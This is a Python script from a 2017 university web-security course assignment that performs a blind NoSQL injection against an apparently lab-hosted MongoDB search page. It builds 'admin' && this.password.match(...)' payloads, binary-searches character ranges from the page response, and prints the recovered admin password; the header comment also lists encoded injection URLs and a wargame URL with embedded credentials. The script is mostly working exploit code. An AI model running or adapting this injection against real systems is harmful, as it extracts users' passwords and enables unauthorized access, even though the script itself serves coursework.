#CS510 Web Security Andrew Rogers Program 1
#Fall 2017

'''
natas15 address
http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/

regular expressions

Regex to match all password-- this.password.match(/^.*/)

Add MondoDB comment and inject
?search=admin' && this.password.match(/^.*/)//

Only match if first char of password is capital letter or digit
 http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5bA-Z0-9%5d.*%2F)%2F%2F

Only match if first char of password is lowercase letter 
 http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5ba-z%5d.*%2F)%2F%2F

parking lot
cap_url = "http://localhost:8000/mongodb/example2/?" + test_load ###### NORMAL LOAD

'''
import requests
import urllib
import re
from bs4 import BeautifulSoup as soup

def buildPayload(rangeStr, known_chars):
	if known_chars:
		tempPayload = "admin' && this.password.match(/^" + known_chars + "[" + rangeStr + "].*/)//"
	else:
		tempPayload = "admin' && this.password.match(/^[" + rangeStr + "].*/)//"
	newPayload = {"search" : tempPayload}
	return urllib.parse.urlencode(newPayload)

def testMatch(site_url, payload):
	session = requests.Session()
	test_url = site_url + payload
	resp = session.get(test_url)
	test_soup = soup(resp.text, "html.parser")
	if (test_soup.body.find_all(string="admin")):
		return True
	else:
		return False

def matchBranch(site_url,test_range, known_chars):
	goal_char = ""
	if None:
		print("range is empty")
	elif (len(test_range) == 1):
		if testMatch(site_url,buildPayload(test_range,known_chars)):
			#print("char found: %s" % test_range)
			goal_char = test_range
	else:	
		if testMatch(site_url,buildPayload(test_range,known_chars)):
			#print("found in range %s, testing branches" % test_range)
			halfLenRange = int(len(test_range) / 2)
			left_range = test_range[:halfLenRange]
			#print("testing left with %s" % left_range)
			left_goal = matchBranch(site_url,left_range,known_chars)
			right_range = test_range[halfLenRange:]
			#print("testing right with %s" % right_range)
			right_goal = matchBranch(site_url,right_range,known_chars)
			if left_goal:
				goal_char = left_goal
			if right_goal:
				goal_char = right_goal
		'''else:
			print("not found in %s" % test_range)'''
	if goal_char or (goal_char == ""):
		return goal_char

full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
target_url = "http://localhost:8000/mongodb/example2/?"
pwd = ""
search_range = full_range

while matchBranch(target_url,search_range,pwd):
	next_char = matchBranch(target_url,search_range,pwd)
	#print("next_char is: %s" % next_char)
	if pwd:
		pwd = pwd + next_char
	else:
		pwd = next_char
	#print("pwd is now: %s" % pwd)

print("The password is: %s" % pwd)